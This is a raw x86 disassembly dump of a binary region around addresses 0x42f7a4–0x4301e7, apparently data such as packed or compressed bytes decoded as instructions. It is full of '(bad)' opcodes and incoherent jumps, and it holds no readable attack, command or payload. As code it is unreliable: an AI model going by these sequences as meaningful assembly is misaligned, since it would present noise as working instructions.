  42f7a4:	mov    cl,0xd7
  42f7a6:	icebp  
  42f7a7:	fisubr DWORD PTR [ecx]
  42f7a9:	retf   0x461a
  42f7ac:	adc    bh,BYTE PTR [ebp-0x2]
  42f7af:	pop    edx
  42f7b0:	clc    
  42f7b1:	sbb    al,0xfb
  42f7b3:	xor    ebx,DWORD PTR [edx-0x1b652d8f]
  42f7b9:	arpl   WORD PTR [edi],sp
  42f7bb:	xchg   BYTE PTR [esi-0x1717e2bc],ch
  42f7c1:	dec    edi
  42f7c2:	add    eax,0x2a01e4f6
  42f7c7:	mov    bl,0x90
  42f7c9:	(bad)  
  42f7ca:	mov    al,ds:0xda012cca
  42f7cf:	sbb    eax,0x5fd7fffd
  42f7d4:	jmp    0x8777:0x99689756
  42f7db:	mov    esi,0x96a198b2
  42f7e0:	in     al,0x1f
  42f7e2:	fidivr DWORD PTR [eax-0x4f]
  42f7e5:	pop    ebp
  42f7e6:	imul   BYTE PTR [eax-0x434bc37b]
  42f7ec:	shl    esi,cl
	...
  42f856:	jno    0x42f7f9
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0x5dda828f
  42f866:	addr16 std 
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	add    BYTE PTR [ecx],al
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	js     0x42f877
  42f870:	imul   edi,DWORD PTR [ecx+eax*2-0x47],0x79
  42f875:	xor    bl,BYTE PTR [edx]
  42f877:	sub    eax,DWORD PTR [eax+0x70a1ce4c]
  42f87d:	jmp    DWORD PTR [eax+esi*2]
  42f880:	push   ds
  42f881:	test   al,0xfb
  42f883:	stos   DWORD PTR es:[edi],eax
  42f884:	mov    ds:0x524a6861,al
  42f889:	mov    bl,BYTE PTR [edx]
  42f88b:	in     eax,dx
  42f88c:	push   ss
  42f88d:	lds    ebx,FWORD PTR [esi+0x2f]
  42f890:	imul   esp
  42f892:	dec    eax
  42f893:	imul   esi,DWORD PTR [esi+ebx*8+0x3],0x4071d890
  42f89b:	stc    
  42f89c:	xchg   edx,eax
  42f89d:	ins    BYTE PTR es:[edi],dx
  42f89e:	xor    bh,BYTE PTR [edi]
  42f8a0:	xor    al,0x14
  42f8a2:	dec    esi
  42f8a3:	adc    edi,esi
  42f8a5:	in     al,0x43
  42f8a7:	out    dx,eax
  42f8a8:	fadd   st,st(2)
  42f8aa:	xor    dl,BYTE PTR [esi-0x77]
  42f8ad:	push   ebx
  42f8ae:	sbb    al,0x9a
  42f8b0:	je     0x42f83c
  42f8b2:	xlat   BYTE PTR ds:[ebx]
  42f8b3:	and    DWORD PTR [ebp+ebp*8+0x7034108],edx
  42f8ba:	inc    ecx
  42f8bb:	push   0xffffffad
  42f8bd:	ror    BYTE PTR [edx],cl
  42f8bf:	pop    ebp
  42f8c0:	repz clc 
  42f8c2:	mov    esp,0x1d2b6086
  42f8c7:	jg     0x42f8fb
  42f8c9:	bound  ebx,QWORD PTR [ebx+eax*4+0x43]
  42f8cd:	adc    al,0x16
  42f8cf:	mov    dh,0x2b
  42f8d1:	jne    0x42f93b
  42f8d3:	xchg   edx,eax
  42f8d4:	aad    0xa4
  42f8d6:	imul   edi,DWORD PTR [esi-0x460c7ae0],0xffffffb1
  42f8dd:	push   edx
  42f8de:	mov    bl,0xc2
  42f8e0:	retf   
  42f8e1:	mov    ah,0xcf
  42f8e3:	es js  0x42f87c
  42f8e6:	push   edx
  42f8e7:	cs mov cl,0x23
  42f8ea:	cmp    edi,edx
  42f8ec:	adc    eax,0x7935e3aa
  42f8f1:	jns    0x42f92b
  42f8f3:	cmp    esi,DWORD PTR [ebx+0x37057897]
  42f8f9:	in     al,0x4b
  42f8fb:	mov    al,0x85
  42f8fd:	rol    DWORD PTR [ebp+0x3e],cl
  42f900:	repz out 0xa0,al
  42f903:	jno    0x42f8b7
  42f905:	imul   ebp,DWORD PTR [edx],0x30a752e2
  42f90b:	dec    edi
  42f90c:	and    eax,0xd725a780
  42f911:	mov    eax,ds:0xac74dbf5
  42f916:	aas    
  42f917:	pop    es
  42f918:	or     ebx,DWORD PTR [ebx]
  42f91a:	add    al,0x69
  42f91c:	mov    BYTE PTR [ebx+0x67deddae],dl
  42f922:	jmp    0x42f8e3
  42f924:	sub    BYTE PTR [edx+0x37be4c5e],ah
  42f92a:	outs   dx,BYTE PTR ds:[esi]
  42f92b:	fmul   DWORD PTR [ebx+0x1b]
  42f92e:	mov    DWORD PTR [ebx+eiz*8+0x32],esi
  42f932:	test   cl,dh
  42f934:	or     al,0x4
  42f936:	(bad)  
  42f937:	jge    0x42f8ec
  42f939:	pop    ss
  42f93a:	and    al,0x3c
  42f93c:	mov    al,0xb4
  42f93e:	pusha  
  42f93f:	add    BYTE PTR [edx+eax*8-0x3b],al
  42f943:	mov    edi,0x78c0f243
  42f948:	cld    
  42f949:	inc    edx
  42f94a:	xchg   ebx,eax
  42f94b:	lock pop ds
  42f94d:	aas    
  42f94e:	jae    0x42f908
  42f950:	inc    eax
  42f951:	dec    edi
  42f952:	dec    esp
  42f953:	icebp  
  42f954:	fild   WORD PTR [ebx]
  42f956:	xor    BYTE PTR [esi+esi*1+0x30],al
  42f95a:	push   0x6448287a
  42f95f:	out    0x66,al
  42f961:	scas   al,BYTE PTR es:[edi]
  42f962:	gs jp  0x42f9cf
  42f965:	in     eax,dx
  42f966:	or     DWORD PTR [ebp-0x51],0x6d
  42f96a:	push   0xffffffc4
  42f96c:	rcl    DWORD PTR [edi+0x0],1
	...
  42f9d6:	adc    al,0x74
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42f97b
  42f9e3:	jmp    0xfeaa17d6
  42f9e8:	add    DWORD PTR [eax],eax
  42f9ea:	add    BYTE PTR [ecx],al
  42f9ec:	add    BYTE PTR [eax],al
  42f9ee:	sub    DWORD PTR [ebx],ebx
  42f9f0:	mov    ch,0xb9
  42f9f2:	and    al,0x64
  42f9f4:	add    dh,bh
  42f9f6:	fcomi  st,st(5)
  42f9f8:	in     al,dx
  42f9f9:	or     DWORD PTR [ecx+0x46cffc42],esi
  42f9ff:	xor    DWORD PTR [ecx-0x4f9d1a83],0xffffffab
  42fa06:	jbe    0x42f995
  42fa08:	ins    DWORD PTR es:[edi],dx
  42fa09:	fistp  WORD PTR [esi]
  42fa0b:	push   ds
  42fa0c:	call   0xbb29a19c
  42fa11:	les    ecx,FWORD PTR [ecx+edi*2+0x4f138ece]
  42fa18:	daa    
  42fa19:	jp     0x42fa3c
  42fa1b:	daa    
  42fa1c:	cdq    
  42fa1d:	push   0xa28b9a77
  42fa22:	and    DWORD PTR [edx],ebx
  42fa24:	fcomp  QWORD PTR [ebx]
  42fa26:	pop    esp
  42fa27:	outs   dx,DWORD PTR ds:[esi]
  42fa28:	mov    edi,0x28de5d54
  42fa2d:	or     DWORD PTR [ecx-0x34eec5c],edx
  42fa33:	or     eax,0xc2c5a249
  42fa38:	inc    eax
  42fa39:	sub    DWORD PTR [eax-0x70],eax
  42fa3c:	adc    al,BYTE PTR [esi-0x70c324e0]
  42fa42:	outs   dx,BYTE PTR ds:[esi]
  42fa43:	push   ss
  42fa44:	sbb    DWORD PTR [eax],ebx
  42fa46:	jp     0x42fa3b
  42fa48:	mov    ebx,edx
  42fa4a:	mov    esp,0x78d19d0a
  42fa4f:	fnstenv [ebx]
  42fa51:	sub    bl,bh
  42fa53:	mov    esi,0xea2bc76f
  42fa58:	xor    eax,0x49c62ad3
  42fa5d:	push   esp
  42fa5e:	and    BYTE PTR [ecx+0x148437a1],ah
  42fa64:	jnp    0x42fa22
  42fa66:	and    eax,0xd4662ff6
  42fa6b:	push   ebx
  42fa6c:	(bad)  
  42fa6d:	push   ecx
  42fa6e:	lahf   
  42fa6f:	add    al,0x50
  42fa71:	push   ebp
  42fa72:	cmp    ecx,DWORD PTR [ecx-0x2d]
  42fa75:	ret    0x6994
  42fa78:	push   edi
  42fa79:	leave  
  42fa7a:	ss cmp bl,cl
  42fa7d:	lods   eax,DWORD PTR ds:[esi]
  42fa7e:	xor    ebx,eax
  42fa80:	mov    dl,0x39
  42fa82:	repnz ror BYTE PTR [edi+0xb],0x2a
  42fa87:	mov    ch,0x97
  42fa89:	mov    ecx,0x119de2d8
  42fa8e:	rol    DWORD PTR [ecx-0x5ec1d779],0xd1
  42fa95:	pop    ss
  42fa96:	sbb    al,0x31
  42fa98:	push   ecx
  42fa99:	add    bh,0xf3
  42fa9c:	fsub   DWORD PTR ds:[esi+ebx*4+0x7a]
  42faa1:	(bad)  
  42faa2:	jecxz  0x42fa29
  42faa4:	lods   eax,DWORD PTR ds:[esi]
  42faa5:	adc    eax,0x49299845
  42faaa:	xchg   ebx,eax
  42faab:	mov    edi,0xd5f71440
  42fab0:	lahf   
  42fab1:	lea    esi,[ebx]
  42fab3:	pop    ds
  42fab4:	call   0x944cd72f
  42fab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42faba:	mov    dl,0xf7
  42fabc:	jle    0x42fa89
  42fabe:	xor    eax,0x6f2fb01e
  42fac3:	sbb    ebp,esi
  42fac5:	jge    0x42fb34
  42fac7:	xor    edx,DWORD PTR [ebx+ebp*4+0x52]
  42facb:	push   ecx
  42facc:	sbb    DWORD PTR [ecx+ebx*4+0xb],ebx
  42fad0:	stos   BYTE PTR es:[edi],al
  42fad1:	fcomp  st(3)
  42fad3:	hlt    
  42fad4:	sub    BYTE PTR [esi-0x2d],ah
  42fad7:	into   
  42fad8:	inc    edx
  42fad9:	mov    ebp,0x6b2e0f2c
  42fade:	aas    
  42fadf:	inc    DWORD PTR [edx-0x773aa7c5]
  42fae5:	push   eax
  42fae6:	push   esp
  42fae7:	ja     0x42fb25
  42fae9:	pop    edi
  42faea:	jns    0x42fb1a
  42faec:	mov    ds:0x7,eax
	...
  42fb55:	add    BYTE PTR [ebx],bl
  42fb57:	out    dx,eax
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	mov    ds:0x678c95b8,al
  42fb67:	inc    DWORD PTR [ecx]
  42fb69:	add    BYTE PTR [eax],al
  42fb6b:	add    DWORD PTR [eax],eax
  42fb6d:	add    BYTE PTR [ebx],ah
  42fb6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb70:	and    ecx,DWORD PTR [eax-0x3d6665f8]
  42fb76:	fs daa 
  42fb78:	mov    bh,0xf8
  42fb7a:	push   cs
  42fb7b:	fucomip st,st(2)
  42fb7d:	push   ecx
  42fb7e:	xchg   ebx,eax
  42fb7f:	jle    0x42fb3c
  42fb81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb82:	or     BYTE PTR [eax-0x59],0xdf
  42fb86:	dec    eax
  42fb87:	mov    dh,0x25
  42fb89:	not    DWORD PTR [esi+0x485e83ad]
  42fb8f:	push   eax
  42fb90:	test   ah,dh
  42fb92:	sub    esi,DWORD PTR [edx-0x589634d9]
  42fb98:	pushf  
  42fb99:	xchg   esi,eax
  42fb9a:	xchg   esi,eax
  42fb9b:	cmp    al,0x1f
  42fb9d:	jl     0x42fc0f
  42fb9f:	and    ch,BYTE PTR [ecx+0x415b15c1]
  42fba5:	gs push edi
  42fba7:	push   ebx
  42fba8:	mov    ebp,0xef5a0720
  42fbad:	and    DWORD PTR [edx*8+0x93eb901],ecx
  42fbb4:	mov    ds,WORD PTR [edi+0x3efc72a0]
  42fbba:	and    DWORD PTR [edx-0x48e47ac8],ebp
  42fbc0:	xchg   edi,eax
  42fbc1:	imul   BYTE PTR [ebp-0x280d4a66]
  42fbc7:	(bad)  
  42fbc8:	call   0x6e58c89
  42fbcd:	mov    WORD PTR [ebx],cs
  42fbcf:	cs in  al,dx
  42fbd1:	mov    al,ds:0x6ae8645d
  42fbd6:	fadd   QWORD PTR [eax+eax*1-0x43]
  42fbda:	jnp    0x42fb8c
  42fbdc:	sub    al,0x82
  42fbde:	sub    dl,al
  42fbe0:	retf   0xddd6
  42fbe3:	or     al,0xe7
  42fbe5:	jp     0x42fbb9
  42fbe7:	cmp    al,0x1e
  42fbe9:	iret   
  42fbea:	lahf   
  42fbeb:	add    cl,BYTE PTR [edx]
  42fbed:	adc    al,0x96
  42fbef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fbf0:	aad    0xf1
  42fbf2:	(bad)  
  42fbf3:	fmul   DWORD PTR [ebp+0x0]
  42fbf6:	scas   al,BYTE PTR es:[edi]
  42fbf7:	push   0xb75aee5f
  42fbfc:	inc    ecx
  42fbfd:	ja     0x42fbf7
  42fbff:	fst    QWORD PTR [esi]
  42fc01:	cmp    DWORD PTR [eax],ebx
  42fc03:	test   BYTE PTR [edi],bh
  42fc05:	dec    esp
  42fc07:	push   ds
  42fc08:	push   ecx
  42fc09:	sahf   
  42fc0a:	fnstcw WORD PTR [ecx+eax*8]
  42fc0d:	inc    ebx
  42fc0e:	in     al,0x3e
  42fc10:	mov    esi,0x4905ff51
  42fc15:	jnp    0x42fbeb
  42fc17:	jmp    0x42fc45
  42fc19:	push   0x5c
  42fc1b:	sbb    DWORD PTR [ebp-0x80],ebp
  42fc1e:	sbb    BYTE PTR [ebx+edx*2+0x71],bl
  42fc22:	je     0x42fbd0
  42fc24:	mov    edi,0x52369ad6
  42fc29:	clc    
  42fc2a:	int3   
  42fc2b:	add    eax,0x72d13625
  42fc30:	add    al,0x84
  42fc32:	pop    ebx
  42fc33:	dec    ebx
  42fc34:	cmp    dl,bh
  42fc36:	(bad)  
  42fc37:	lock jle 0x42fc84
  42fc3a:	add    DWORD PTR fs:[edx+0x142dca13],0xffffffc5
  42fc42:	or     dl,BYTE PTR [edi]
  42fc44:	add    edx,DWORD PTR [eax]
  42fc46:	adc    eax,0xf284fb02
  42fc4b:	mov    eax,0xd6a8895b
  42fc50:	arpl   WORD PTR [ebx-0x2975e062],di
  42fc56:	pop    ebx
  42fc57:	inc    esp
  42fc58:	push   ebx
  42fc59:	or     al,0x9e
  42fc5b:	mov    cs,esi
  42fc5d:	lds    ebp,FWORD PTR [esi]
  42fc5f:	ror    BYTE PTR [esi],cl
  42fc61:	scas   eax,DWORD PTR es:[edi]
  42fc62:	mov    esp,DWORD PTR [ebx+0x6cac2251]
  42fc68:	and    bl,BYTE PTR [eax]
  42fc6a:	cwde   
  42fc6b:	mov    ch,0x19
  42fc6d:	add    BYTE PTR cs:[eax],al
	...
  42fcd4:	add    BYTE PTR [eax],al
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    BYTE PTR [esi],ch
  42fce3:	aam    0x66
  42fce5:	xchg   BYTE PTR [edi+0x0],ah
  42fce8:	add    al,BYTE PTR [eax]
  42fcea:	add    BYTE PTR [ecx],al
  42fcec:	add    BYTE PTR [eax],al
  42fcee:	popf   
  42fcef:	mov    ah,0x8d
  42fcf1:	sbb    BYTE PTR [eax-0x52],ch
  42fcf4:	add    edi,edx
  42fcf6:	adc    eax,0xfaee6638
  42fcfb:	aam    0xf9
  42fcfd:	jnp    0x42fd70
  42fcff:	loope  0x42fcac
  42fd01:	icebp  
  42fd02:	or     eax,0xb537861f
  42fd07:	sub    eax,0x1262bdf7
  42fd0c:	xchg   edx,eax
  42fd0d:	jbe    0x42fd15
  42fd0f:	xor    DWORD PTR [ebx+0x79],esp
  42fd12:	sbb    DWORD PTR [ebp+0x7e],ebx
  42fd15:	jmp    0x73a8b5a5
  42fd1a:	test   al,0xb2
  42fd1c:	ja     0x42fd6a
  42fd1e:	int3   
  42fd1f:	push   ds
  42fd20:	mov    edi,0x18064258
  42fd25:	in     al,0xf5
  42fd27:	int    0xb3
  42fd29:	test   BYTE PTR [ebx+0x7b],cl
  42fd2c:	int    0x8
  42fd2e:	stos   DWORD PTR es:[edi],eax
  42fd2f:	pop    eax
  42fd30:	mov    BYTE PTR [eax-0xb],bl
  42fd33:	pop    edi
  42fd34:	mov    bh,dh
  42fd36:	dec    ebx
  42fd37:	adc    eax,0xe263a6ff
  42fd3c:	fs add ebx,edx
  42fd3f:	clc    
  42fd40:	push   edi
  42fd41:	test   BYTE PTR [ebx+0x1bd41626],dl
  42fd47:	nop
  42fd48:	loope  0x42fd23
  42fd4a:	dec    ecx
  42fd4b:	sbb    DWORD PTR [edi-0xb8f58e6],edi
  42fd51:	mov    bh,0x77
  42fd53:	xor    DWORD PTR [edx],esi
  42fd55:	dec    ebp
  42fd56:	daa    
  42fd57:	sub    eax,DWORD PTR [ecx-0x78bf3acd]
  42fd5d:	adc    eax,0xc86fe38f
  42fd62:	fwait
  42fd63:	mov    gs,esi
  42fd65:	pop    es
  42fd66:	or     DWORD PTR [eax],esi
  42fd68:	and    DWORD PTR [esi-0x31],edx
  42fd6b:	jl     0x42fd54
  42fd6d:	out    0x40,eax
  42fd6f:	dec    ebp
  42fd70:	jl     0x42fd47
  42fd72:	jae    0x42fd2c
  42fd74:	cs xor ch,bl
  42fd77:	pusha  
  42fd78:	cmc    
  42fd79:	retf   
  42fd7a:	jle    0x42fd4c
  42fd7c:	dec    ebx
  42fd7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd7e:	push   ebx
  42fd7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd81:	pop    esi
  42fd82:	dec    ebx
  42fd83:	ja     0x42fd2f
  42fd85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd86:	clc    
  42fd87:	mov    cl,0x1c
  42fd89:	dec    ecx
  42fd8a:	out    0x5b,eax
  42fd8c:	mov    eax,ds:0xdb986bfc
  42fd91:	rcl    eax,0xee
  42fd94:	dec    edi
  42fd95:	int3   
  42fd96:	sub    ebp,DWORD PTR [edi-0x1bc6acd5]
  42fd9c:	lock jmpw 0xc750
  42fda1:	inc    eax
  42fda2:	mov    esp,0x7ba3b286
  42fda7:	sbb    al,0xc3
  42fda9:	sar    BYTE PTR [edi-0x5dbd34e],cl
  42fdaf:	aam    0x9b
  42fdb1:	mov    ebp,DWORD PTR [edi]
  42fdb3:	add    esi,esi
  42fdb5:	add    ebp,DWORD PTR ds:0xe897066d
  42fdbb:	xchg   DWORD PTR cs:[eax+0x1b],ecx
  42fdbf:	mov    bh,dh
  42fdc1:	dec    BYTE PTR [ecx+0x7b]
  42fdc4:	lock xor eax,0x3e3b1238
  42fdca:	cmp    al,0x8d
  42fdcc:	in     eax,0xc2
  42fdce:	aam    0x4c
  42fdd0:	ss in  al,0xf2
  42fdd3:	clc    
  42fdd4:	mov    ?,WORD PTR ds:0x902c78cb
  42fdda:	lea    ebp,[ecx+edx*2+0x26]
  42fdde:	stc    
  42fddf:	loopne 0x42fdfa
  42fde1:	add    BYTE PTR [ecx],dh
  42fde3:	test   BYTE PTR [ebx+0x63],dh
  42fde6:	sub    ecx,DWORD PTR [eax+0x7e]
  42fde9:	xchg   ebx,eax
  42fdea:	xchg   esp,eax
  42fdeb:	call   0x4323d4
	...
  42fe54:	add    BYTE PTR [eax],al
  42fe56:	dec    eax
  42fe57:	rol    dl,0xf0
  42fe5a:	retf   0x7af2
  42fe5d:	clc    
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz cmp BYTE PTR ds:0x167b03a,ch
  42fe68:	add    al,BYTE PTR [eax]
  42fe6a:	add    BYTE PTR [ecx],al
  42fe6c:	add    BYTE PTR [eax],al
  42fe6e:	fcom   DWORD PTR [ecx-0x194680cc]
  42fe74:	bound  eax,QWORD PTR [edi-0x344325a]
  42fe7a:	mov    ebp,0xe1d5c3eb
  42fe7f:	xor    esp,DWORD PTR [edi]
  42fe81:	jo     0x42fef1
  42fe83:	inc    esi
  42fe84:	in     eax,0xef
  42fe86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe87:	fdiv   st,st(7)
  42fe89:	sub    bl,BYTE PTR [eax+eax*8-0x1]
  42fe8d:	fs ins BYTE PTR es:[edi],dx
  42fe8f:	scas   eax,DWORD PTR es:[edi]
  42fe90:	and    DWORD PTR [eax-0x77],ebx
  42fe93:	in     eax,0xd8
  42fe95:	and    DWORD PTR [edi-0x4b],ecx
  42fe98:	scas   eax,DWORD PTR es:[edi]
  42fe99:	and    esi,0x1b
  42fe9c:	cld    
  42fe9d:	call   0xcc58b5ee
  42fea2:	xchg   BYTE PTR [eax+ebx*1-0x3777e1d6],cl
  42fea9:	jge    0x42fef6
  42feab:	bound  ebx,QWORD PTR [edx-0x50]
  42feae:	dec    esp
  42feb0:	fisttp WORD PTR [edi]
  42feb2:	ins    DWORD PTR es:[edi],dx
  42feb3:	lahf   
  42feb4:	push   esi
  42feb5:	sbb    al,0xc5
  42feb7:	jne    0x42fedc
  42feb9:	mov    cl,0x90
  42febb:	lds    ebx,FWORD PTR [edi-0x34]
  42febe:	dec    edx
  42febf:	and    dh,0xd2
  42fec2:	adc    eax,edx
  42fec4:	outs   dx,BYTE PTR ds:[esi]
  42fec5:	arpl   WORD PTR [ecx],di
  42fec7:	sti    
  42fec8:	dec    esi
  42fec9:	dec    edi
  42feca:	mov    al,ds:0xe208578b
  42fecf:	lahf   
  42fed0:	mov    ds:0x4fcb5f7,eax
  42fed5:	ret    
  42fed6:	mov    ebp,0x409e781c
  42fedb:	mov    ch,bl
  42fedd:	js     0x42feee
  42fedf:	cmp    eax,0x36fc5114
  42fee4:	shr    BYTE PTR [edx+0x385e15e2],1
  42feea:	mul    BYTE PTR [esi+ecx*1]
  42feed:	fbld   TBYTE PTR [edx]
  42feef:	mov    ebx,0x1463d92b
  42fef4:	push   edi
  42fef5:	mov    ds:0x90114bef,al
  42fefa:	lock jg 0x42ff5e
  42fefd:	push   ebx
  42fefe:	push   0x69178c04
  42ff03:	popf   
  42ff04:	push   ecx
  42ff05:	sahf   
  42ff06:	mov    cs,WORD PTR [edx]
  42ff08:	add    eax,DWORD PTR [ebp-0x70d32ee]
  42ff0e:	lock sub al,0x90
  42ff11:	test   BYTE PTR [eax-0x65e78be3],al
  42ff17:	or     ebp,ebp
  42ff19:	lahf   
  42ff1a:	mov    WORD PTR [ecx-0x187a2ab7],?
  42ff20:	(bad)  [esi]
  42ff22:	imul   edx,DWORD PTR [ebp+0x7c1e13b8],0x84af39ce
  42ff2c:	jnp    0x42ff4d
  42ff2e:	xchg   ebp,eax
  42ff2f:	push   ebx
  42ff30:	retf   0x6487
  42ff33:	imul   ebx,esi,0x38632ffa
  42ff39:	out    0xc0,eax
  42ff3b:	arpl   WORD PTR [esp+eiz*8+0x13],bp
  42ff3f:	or     al,0x1e
  42ff41:	mov    ebp,0x9b33cfb2
  42ff46:	stos   BYTE PTR es:[edi],al
  42ff47:	inc    eax
  42ff48:	fwait
  42ff49:	dec    ebx
  42ff4a:	jge    0x42ff36
  42ff4c:	jge    0x42ff6d
  42ff4e:	lea    eax,[edx-0x36]
  42ff51:	ins    BYTE PTR es:[edi],dx
  42ff52:	add    eax,0x761caeb5
  42ff57:	and    dl,bh
  42ff59:	jne    0x42ffca
  42ff5b:	(bad)  
  42ff5c:	into   
  42ff5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ff5e:	inc    eax
  42ff5f:	je     0x42ff94
  42ff61:	mov    edi,0x5c732b68
  42ff66:	cmp    esi,ecx
  42ff68:	fucom  st(0)
  42ff6a:	loope  0x42ffd4
  42ff6c:	rcr    dh,1
	...
  42ffd6:	add    al,0x67
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [eax+edx*8-0x2d],0xaa
  42ffe5:	outs   dx,DWORD PTR ds:[esi]
  42ffe6:	add    al,BYTE PTR [bp+si]
  42ffe9:	add    BYTE PTR [eax],al
  42ffeb:	add    DWORD PTR [eax],eax
  42ffed:	add    BYTE PTR [ebp+0x72],cl
  42fff0:	(bad)  
  42fff2:	cmc    
  42fff3:	mov    ebp,es
  42fff5:	call   0xfddae0f5
  42fffa:	add    al,0xa2
  42fffc:	retf   0xb56
  42ffff:	aam    0xbb
  430001:	and    eax,0x23bab509
  430006:	cwde   
  430007:	gs (bad) 
  43000a:	das    
  43000b:	fwait
  43000c:	bound  esi,QWORD PTR [edi-0x308a6bda]
  430012:	pop    eax
  430013:	mov    ebx,DWORD PTR [ebx]
  430015:	add    al,0x5
  430017:	jge    0x430002
  430019:	repz xor ebx,DWORD PTR [ecx-0x1d]
  43001d:	sbb    BYTE PTR [esi],ah
  43001f:	and    eax,0x1586edd8
  430024:	push   cs
  430025:	sub    BYTE PTR es:[eax],cl
  430028:	jle    0x430044
  43002a:	es sbb eax,0x212884
  430030:	dec    edx
  430031:	inc    esi
  430032:	pop    edx
  430033:	jmp    0x42fff8
  430035:	lods   eax,DWORD PTR ds:[esi]
  430036:	push   ebx
  430037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430038:	(bad)  
  430039:	mov    edi,0x68aa24e4
  43003e:	scas   al,BYTE PTR es:[edi]
  43003f:	aas    
  430040:	clc    
  430041:	mov    ds:0x144c830a,al
  430046:	jns    0x430040
  430048:	int3   
  430049:	dec    ecx
  43004a:	pop    ds
  43004b:	mov    eax,ds:0x4d94dd10
  430050:	cmc    
  430051:	pop    ebx
  430052:	xor    eax,0x1f99ff63
  430057:	stos   DWORD PTR es:[edi],eax
  430058:	lods   eax,DWORD PTR ds:[esi]
  430059:	fsubrp st(2),st
  43005b:	aas    
  43005c:	fimul  DWORD PTR [edx]
  43005e:	add    ch,BYTE PTR [edx-0x4a]
  430061:	(bad)  [esp+edx*8]
  430064:	stos   BYTE PTR es:[edi],al
  430065:	(bad)  
  430066:	xor    al,0x1c
  430068:	push   esp
  430069:	mov    al,ds:0x59e66060
  43006e:	inc    cx
  430070:	or     eax,0xd5394bf1
  430075:	ret    0xfaac
  430078:	sub    DWORD PTR [esi+0x1dfa0101],0xa418839a
  430082:	sahf   
  430083:	xor    ebx,DWORD PTR [ebx+eiz*2]
  430086:	int3   
  430087:	xor    ebx,ecx
  430089:	xchg   ecx,eax
  43008a:	fwait
  43008b:	jbe    0x430071
  43008d:	mov    ss,edi
  43008f:	xor    DWORD PTR [edi+edi*4-0x5f],edi
  430093:	aas    
  430094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430095:	mov    ch,0x4e
  430097:	dec    ebp
  430098:	repz xchg ecx,eax
  43009a:	push   ss
  43009b:	test   al,0x51
  43009d:	mov    DWORD PTR [eax+ebp*8-0x78],0x610380f7
  4300a5:	out    dx,al
  4300a6:	enter  0x7b39,0x5b
  4300aa:	retf   
  4300ab:	loope  0x4300ea
  4300ad:	aaa    
  4300ae:	push   ss
  4300af:	jne    0x430052
  4300b1:	ja     0x4300b7
  4300b3:	es repz inc esp
  4300b6:	shr    BYTE PTR [edi+ebx*4],1
  4300b9:	gs in  al,dx
  4300bb:	(bad)  
  4300bc:	shl    DWORD PTR [ebp+0x58351dcd],1
  4300c2:	ss out 0xe6,eax
  4300c5:	outs   dx,BYTE PTR ds:[esi]
  4300c6:	sub    ah,BYTE PTR [ebx+0x41]
  4300c9:	xor    eax,0x4b9c002b
  4300ce:	leave  
  4300cf:	mov    dl,0x6e
  4300d1:	and    al,0x7d
  4300d3:	stos   DWORD PTR es:[edi],eax
  4300d4:	lods   al,BYTE PTR ds:[esi]
  4300d5:	mov    edx,0xcfeb6a67
  4300da:	cwde   
  4300db:	aas    
  4300dc:	dec    ebp
  4300dd:	and    BYTE PTR [esi+ecx*8-0x13a73f70],al
  4300e4:	lods   eax,DWORD PTR ds:[esi]
  4300e5:	fild   QWORD PTR [eax]
  4300e7:	xor    BYTE PTR [eax+0x58faad3d],bh
  4300ed:	mov    ebp,0x0
	...
  430156:	(bad)  
  430157:	ins    DWORD PTR es:[edi],dx
  430158:	aam    0xb5
  43015a:	(bad)  
  43015b:	mov    ebp,0x9547fe7
  430160:	scas   eax,DWORD PTR es:[edi]
  430161:	add    al,0xf9
  430163:	or     eax,0x3671b6c
  430168:	add    al,BYTE PTR [eax]
  43016a:	adc    al,BYTE PTR [eax]
  43016c:	add    BYTE PTR [eax],al
  43016e:	out    dx,eax
  43016f:	(bad)  [edx]
  430171:	sbb    esi,eax
  430173:	ins    BYTE PTR es:[edi],dx
  430174:	ja     0x4301cd
  430176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430178:	icebp  
  430179:	dec    edx
  43017a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43017b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43017c:	push   ecx
  43017d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43017e:	test   eax,0x18
	...
  4301d3:	add    BYTE PTR [eax],al
  4301d5:	add    BYTE PTR [ebp+0x55],cl
  4301d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4301de:	mov    esp,ebp
  4301e0:	or     al,ah
  4301e2:	dec    ebp
  4301e3:	add    bh,al
  4301e5:	add    BYTE PTR [eax],cl
  4301e7:	add    BYTE PTR [eax],al
